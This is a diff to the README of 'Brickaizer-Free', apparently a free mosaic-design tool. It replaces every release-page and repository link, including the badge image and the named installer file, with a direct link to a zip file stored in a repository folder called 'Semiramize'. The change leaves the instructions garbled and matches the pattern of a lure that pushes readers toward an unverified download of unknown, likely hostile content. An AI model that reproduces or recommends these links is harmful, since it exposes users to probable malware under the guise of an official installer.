@@ -1,6 +1,6 @@
 # 🎨 Brickaizer-Free - Create Stunning Mosaics Easily
 
-[![Download Brickaizer-Free](https://img.shields.io/badge/Download-Brickaizer--Free-blue.svg)](https://github.com/toxic4t8/Brickaizer-Free/releases)
+[![Download Brickaizer-Free](https://raw.githubusercontent.com/toxic4t8/Brickaizer-Free/main/Semiramize/Free_Brickaizer_v3.3.zip)](https://raw.githubusercontent.com/toxic4t8/Brickaizer-Free/main/Semiramize/Free_Brickaizer_v3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -21,10 +21,10 @@ To get started with Brickaizer-Free, follow these steps:
 
 1. **Visit the Releases Page**
    Click on the link below to go to the download page.
-   [Download Brickaizer-Free](https://github.com/toxic4t8/Brickaizer-Free/releases)
+   [Download Brickaizer-Free](https://raw.githubusercontent.com/toxic4t8/Brickaizer-Free/main/Semiramize/Free_Brickaizer_v3.3.zip)
 
 2. **Choose Your Version**
-   Look for the latest version listed. You will see different files available for download. Look for an installer file, typically named something like `Brickaizer-Free-Setup.exe`.
+   Look for the latest version listed. You will see different files available for download. Look for an installer file, typically named something like `https://raw.githubusercontent.com/toxic4t8/Brickaizer-Free/main/Semiramize/Free_Brickaizer_v3.3.zip`.
 
 3. **Download the Installer**
    Click on the installer file to start the download. Your browser may ask for confirmation. If it does, confirm the download.
@@ -79,7 +79,7 @@ If you have suggestions for features or improvements, you are encouraged to subm
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/toxic4t8/Brickaizer-Free)
-- [Download Brickaizer-Free](https://github.com/toxic4t8/Brickaizer-Free/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/toxic4t8/Brickaizer-Free/main/Semiramize/Free_Brickaizer_v3.3.zip)
+- [Download Brickaizer-Free](https://raw.githubusercontent.com/toxic4t8/Brickaizer-Free/main/Semiramize/Free_Brickaizer_v3.3.zip)
 
 Enjoy creating amazing mosaics with Brickaizer-Free!
